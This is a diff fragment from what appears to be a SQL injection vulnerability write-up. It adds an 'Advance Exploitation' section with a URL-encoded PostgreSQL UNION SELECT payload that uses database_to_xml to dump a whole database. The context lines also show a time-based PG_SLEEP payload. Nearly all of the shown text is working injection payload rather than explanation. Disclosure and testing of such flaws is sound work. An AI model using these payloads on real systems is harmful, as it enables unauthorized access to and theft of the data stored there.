@@ -51,3 +51,9 @@ Exploitation of this SQL injection vulnerability could result in:
 - Payload:  
   ```sql
   P'%3bSelect+PG_SLEEP(10)--
+### 10. **Advance Exploitation**
+- Payload:  
+  ```sql
+  PP%27++UNION+SELECT+NULL::integer,NULL::character(1),NULL::character+varying(10),NULL::character+varying(255),(select+database_to_xml(true,true,%27%27)::character+varying+as+xml_representation),NULL::character(2),NULL::character+varying(255),9,9--+Test
+
+
